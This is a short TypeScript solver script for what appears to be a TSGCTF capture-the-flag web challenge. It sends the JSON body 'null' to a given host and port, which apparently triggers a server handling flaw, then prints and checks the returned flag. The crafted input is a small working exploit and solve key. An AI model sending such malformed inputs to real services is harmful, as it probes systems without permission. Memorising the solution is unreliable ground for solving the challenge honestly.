import axios from 'axios';

if (process.argv.length !== 4) {
	console.log("Usage: ts-node solve.ts <hostname> <port>");
	process.exit(1);
}

const [, , hostname, port] = process.argv;

(async () => {
	const {data: flag} = await axios.post(`http://${hostname}:${port}/`, 'null', {
		validateStatus: null,
		headers: {
			'Content-Type': 'application/json',
		},
	});
	console.log(flag.message);
	if (!flag.message.includes('TSGCTF{')) {
		process.exit(1);
	}
})();
